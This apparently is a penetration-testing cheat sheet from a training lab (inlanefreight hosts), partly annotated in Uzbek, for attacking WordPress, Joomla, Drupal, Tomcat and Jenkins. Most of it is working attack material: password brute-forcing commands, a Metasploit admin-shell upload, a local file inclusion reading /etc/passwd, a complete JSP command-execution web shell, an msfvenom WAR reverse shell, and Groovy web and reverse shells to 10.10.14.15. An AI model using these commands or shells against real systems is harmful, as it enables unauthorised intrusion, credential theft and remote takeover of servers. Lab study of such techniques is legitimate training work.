Nmap - Web Discovery
 `nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list`

Using EyeWitness
 `eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness`

Using Aquatone
 `cat web_discovery.xml | ./aquatone -nmap`

wordpress discovery & enumeration
 `curl -s http://blog.inlanefreight.local | grep WordPress`

themes
 `curl -s http://blog.inlanefreight.local/ | grep themes`
 
plugins
 curl -s http://blog.inlanefreight.local/ | grep plugins

wpscan
 sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
 
attacking wordpress

Login Bruteforce
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

metasploit+reverse_shell
 msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local

Vulnerable Plugins - mail-masta
 curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

Vulnerable Plugins - wpDiscuz
 python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1






Joomla - Discovery & Enumeration
 curl -s http://dev.inlanefreight.local/ | grep Joomla

readme.txt
  curl -s http://dev.inlanefreight.local/README.txt | head -n 5
 
joomla.xml
 curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
 
droopescan
 droopescan scan joomla --url http://dev.inlanefreight.local/

joomla-brute.py
 sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin




Drupal - Discovery & Enumeration
 curl -s http://drupal.inlanefreight.local | grep Drup
 
enumeration
 curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 "" 

scan 
 droopescan scan drupal -u http://drupal.inlanefreight.local
 



Tomcat - Discovery & Enumeration
 curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
 
 request to non-existing page
 
├── bin  --- tomcat server ishlashi uchun kerak boladigan scriptlarni o'zida saqlaydi
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml  --- user credentials
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps   --- default web root
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
        
        
        
web root

webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml  --- mana shu fayl eng kerakli malumotlarni saqlaydi ozida. ilova ishlatadigan routes va classlarni saqlaydi
    └── lib
    |    └── jdbc_drivers.jar
    └── classes   --- bu yerda biznesga aloqador muhim classlar saqlanadi
        └── AdminServlet.class   
        
enumeration
 gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.tx
 
login brute-force
 use auxiliary/scanner/http/tomcat_mgr_login
 set VHOST web01.inlanefreight.local
 set RPORT 8180
 set stop_on_success true
 set rhosts 10.129.201.58
 
Tomcat Manager - WAR File Upload

code
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
code

zip -r backup.war cmd.jsp /backup directory ichiga tushadi

msfvenom reverse_shell
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
 



Attacking Jenkins 
script console orqali rev shell olsa bo'ladi /script endpoint
 
 web shell
 code
 def cmd = 'id'
 def sout = new StringBuffer(), serr = new StringBuffer()
 def proc = cmd.execute()
 proc.consumeProcessOutput(sout, serr)
 proc.waitForOrKill(1000)
 println sout
 code
 
 reverse shell
 code
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 code
 
